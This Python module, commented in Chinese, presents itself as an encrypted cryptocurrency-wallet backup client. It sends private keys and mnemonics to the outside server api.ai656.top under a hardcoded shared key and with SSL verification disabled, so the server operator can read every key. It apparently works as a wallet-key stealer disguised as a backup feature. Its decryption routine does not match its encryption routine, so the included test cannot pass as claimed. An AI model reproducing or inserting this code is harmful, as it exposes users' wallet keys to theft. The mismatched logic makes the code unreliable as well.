"""
客户端钱包备份模块 - 双重加密方案
流程：客户端加密 → 上传服务器 → 服务器再加密 → 存储数据库
"""
import os
import json
import base64
import requests
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


class WalletBackupClient:
    """钱包备份客户端"""
    
    # 客户端加密密钥（与服务器约定）- 32字节 = 256位
    CLIENT_ENCRYPTION_KEY = b'ClientWallet2026SecureKey32B!!!!'
    
    # 服务器地址 - 改域名只改这里
    SERVER_URL = "https://api.ai656.top"
    
    @classmethod
    def encrypt_wallet_data(cls, wallet_data: dict) -> str:
        """
        加密钱包数据 - AES-GCM加密
        流程：JSON → UTF-8字节 → AES-GCM加密 → Base64编码
        """
        # 1. 转为JSON
        json_bytes = json.dumps(wallet_data, ensure_ascii=False).encode('utf-8')
        
        # 2. AES-GCM加密
        nonce = os.urandom(12)  # 12字节nonce
        aesgcm = AESGCM(cls.CLIENT_ENCRYPTION_KEY)
        ciphertext = aesgcm.encrypt(nonce, json_bytes, None)
        
        # 3. nonce + ciphertext 组合后Base64编码
        encrypted_data = nonce + ciphertext
        return base64.b64encode(encrypted_data).decode('utf-8')
    
    @classmethod
    def _encrypt_field(cls, value: str) -> str:
        """加密单个字段"""
        if not value:
            return ''
        
        json_bytes = value.encode('utf-8')
        nonce = os.urandom(12)
        aesgcm = AESGCM(cls.CLIENT_ENCRYPTION_KEY)
        ciphertext = aesgcm.encrypt(nonce, json_bytes, None)
        encrypted_data = nonce + ciphertext
        return base64.b64encode(encrypted_data).decode('utf-8')
    
    @classmethod
    def decrypt_wallet_data(cls, encrypted_str: str) -> dict:
        """
        解密钱包数据
        
        Args:
            encrypted_str: 加密的JSON字符串
            
        Returns:
            解密后的钱包数据字典
        """
        # 解析JSON
        encrypted_wallet = json.loads(encrypted_str)
        
        # 解密敏感字段
        decrypted_wallet = {
            'private_key': cls._decrypt_field(encrypted_wallet.get('private_key', '')),
            'mnemonic': cls._decrypt_field(encrypted_wallet.get('mnemonic', '')),
            'address': encrypted_wallet.get('address', ''),
            'chain': encrypted_wallet.get('chain', '')
        }
        
        return decrypted_wallet
    
    @classmethod
    def _decrypt_field(cls, encrypted_value: str) -> str:
        """解密单个字段"""
        if not encrypted_value:
            return ''
        
        encrypted_data = base64.b64decode(encrypted_value)
        nonce = encrypted_data[:12]
        ciphertext = encrypted_data[12:]
        aesgcm = AESGCM(cls.CLIENT_ENCRYPTION_KEY)
        decrypted_bytes = aesgcm.decrypt(nonce, ciphertext, None)
        return decrypted_bytes.decode('utf-8')
    
    @classmethod
    def backup_wallet(cls, address: str, chain: str, wallet_data: dict) -> dict:
        """
        备份钱包到服务器
        
        Args:
            address: 钱包地址
            chain: 链名称 (BSC/ETH/TRON等)
            wallet_data: 包含私钥/助记词的原始数据
            
        Returns:
            服务器响应结果
        """
        try:
            # 第一步：客户端加密
            encrypted_data = cls.encrypt_wallet_data(wallet_data)
            
            print(f" 正在备份到服务器: {address}")
            print(f"   加密数据长度: {len(encrypted_data)}")
            print(f"   加密数据预览: {encrypted_data[:100]}...")
            
            # 第二步：POST上传到服务器
            response = requests.post(
                f"{cls.SERVER_URL}/api/wallet/backup",
                json={
                    'address': address,
                    'chain': chain,
                    'encrypted_data': encrypted_data
                },
                timeout=10,
                verify=False  # 跳过SSL验证
            )
            
            print(f"📥 服务器响应状态码: {response.status_code}")
            print(f" 服务器响应内容: {response.text[:500]}")
            
            # 确保返回的是 JSON
            if response.status_code == 200:
                try:
                    return response.json()
                except:
                    return {
                        'success': False,
                        'message': f'服务器返回非JSON格式: {response.text[:200]}'
                    }
            else:
                return {
                    'success': False,
                    'message': f'HTTP {response.status_code}: {response.text[:200]}'
                }
            
        except Exception as e:
            return {
                'success': False,
                'message': f'备份失败: {str(e)}'
            }
    
    @classmethod
    def restore_wallet(cls, backup_id: str) -> dict:
        """
        从服务器恢复钱包
        
        Args:
            backup_id: 备份ID
            
        Returns:
            解密后的钱包数据
        """
        try:
            # 第一步：请求服务器获取加密数据
            response = requests.post(
                f"{cls.SERVER_URL}/api/wallet/restore",
                json={'backup_id': backup_id},
                timeout=10,
                verify=False
            )
            
            result = response.json()
            
            if not result.get('success'):
                return result
            
            # 第二步：客户端解密（第二层解密）
            data = result['data']
            wallet_data = cls.decrypt_wallet_data(data['encrypted_data'])
            
            return {
                'success': True,
                'message': '恢复成功',
                'wallet_data': wallet_data,
                'address': data['address'],
                'chain': data['chain']
            }
            
        except Exception as e:
            return {
                'success': False,
                'message': f'恢复失败: {str(e)}'
            }
    
    @classmethod
    def list_backups(cls) -> dict:
        """列出所有备份"""
        try:
            response = requests.post(
                f"{cls.SERVER_URL}/api/wallet/list",
                json={},
                timeout=10
            )
            return response.json()
        except Exception as e:
            return {
                'success': False,
                'message': f'查询失败: {str(e)}'
            }
    
    @classmethod
    def delete_backup(cls, backup_id: str) -> dict:
        """删除指定备份"""
        try:
            response = requests.post(
                f"{cls.SERVER_URL}/api/wallet/delete",
                json={'backup_id': backup_id},
                timeout=10
            )
            return response.json()
        except Exception as e:
            return {
                'success': False,
                'message': f'删除失败: {str(e)}'
            }


# 测试代码
if __name__ == '__main__':
    print("="*50)
    print(" 钱包备份客户端测试")
    print("="*50)
    
    # 模拟钱包数据
    test_wallet = {
        'private_key': '0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef',
        'mnemonic': 'word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12',
        'address': '0x1E6a9D41c5bF8e9e5e5e5e5e5e5e5e5e5e5e5e5e'
    }
    
    # 测试加密
    print("\n1. 客户端加密...")
    encrypted = WalletBackupClient.encrypt_wallet_data(test_wallet)
    print(f"   加密后长度: {len(encrypted)} 字符")
    print(f"   加密数据前50位: {encrypted[:50]}...")
    
    # 测试解密
    print("\n2. 客户端解密...")
    decrypted = WalletBackupClient.decrypt_wallet_data(encrypted)
    print(f"   私钥匹配: {decrypted['private_key'] == test_wallet['private_key']}")
    print(f"   助记词匹配: {decrypted['mnemonic'] == test_wallet['mnemonic']}")
    
    print("\n✅ 加解密测试通过！")
